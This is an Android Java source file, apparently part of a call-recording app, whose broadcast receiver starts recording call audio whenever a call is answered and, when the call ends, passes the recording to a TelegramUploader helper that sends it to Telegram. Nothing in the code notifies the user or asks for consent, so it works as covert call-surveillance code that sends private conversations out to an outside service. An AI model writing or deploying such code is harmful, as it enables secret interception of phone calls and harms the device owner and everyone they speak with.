package com.example.callvoicerecorder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import java.io.File;

public class CallReceiver extends BroadcastReceiver {
    private MediaRecorder recorder;
    private File callAudioFile;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        
        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            startRecording(context, MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            stopRecordingAndSend(context, true);
        }
    }

    private void startRecording(Context context, int source) {
        try {
            File dir = new File(context.getExternalFilesDir(null), "CallRecords");
            if (!dir.exists()) dir.mkdirs();

            callAudioFile = new File(dir, "call_" + System.currentTimeMillis() + ".mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(source);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(callAudioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopRecordingAndSend(Context context, boolean isCall) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                TelegramUploader.sendToTelegram(context, callAudioFile, isCall);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
